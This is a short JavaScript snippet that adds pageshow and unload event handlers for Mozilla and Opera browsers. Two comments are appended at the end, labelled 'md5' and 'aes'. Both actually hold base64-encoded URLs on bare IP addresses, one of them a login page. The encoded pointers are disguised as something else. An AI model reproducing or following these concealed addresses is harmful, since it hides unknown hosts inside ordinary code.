if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzEyMS40My42MS4xODY6ODAwOC8jL2xvZ2luL2xvZ2luP3Y9MTIzNA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/